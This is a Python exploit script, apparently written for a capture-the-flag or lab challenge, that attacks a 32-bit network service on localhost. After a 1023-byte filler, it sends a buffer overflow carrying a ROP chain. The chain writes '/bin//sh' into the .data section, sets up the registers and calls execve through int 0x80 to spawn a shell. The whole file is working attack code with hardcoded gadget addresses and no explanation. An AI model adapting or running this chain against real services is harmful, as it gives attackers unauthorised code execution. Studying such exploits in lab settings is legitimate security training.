#!/usr/bin/env python3

from struct import pack
import socket
import sys
import time


	
if len(sys.argv) != 2:
    sys.exit("Usage: %s PORT" % sys.argv[0])

port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port), socket.getdefaulttimeout(), ('127.0.0.1', 0))

#padding
p = b'A' * 29
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x080ce61f) # inc eax ; ret
p += pack('<I', 0x08074ded) # int 0x80


sock.sendall(b'A'*1023)
time.sleep(1)
sock.sendall(p)

# :vim set sw=4 ts=8 sts=8 expandtab: